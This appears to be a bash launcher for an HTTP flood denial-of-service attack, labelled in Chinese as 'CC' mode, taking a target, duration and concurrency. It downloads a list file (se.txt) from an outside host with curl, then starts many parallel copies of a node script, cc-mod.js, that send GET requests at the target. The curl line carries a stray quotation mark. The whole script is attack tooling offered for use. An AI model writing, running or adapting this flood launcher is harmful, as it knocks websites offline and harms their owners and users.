#!/bin/bash
echo '目标:'$2' 时间:'$3' 并发:'$1' 模式:CC'
#echo '目标:'$2' 时间:'$3' 并发:'$1'' >> ~/cclog.txt
curl http://www.moeyy.net/se.txt' -o ~/se.txt
for n in $(seq $1); do
   node ~/cc-mod.js $2 ~/se.txt $3 GET &
done 
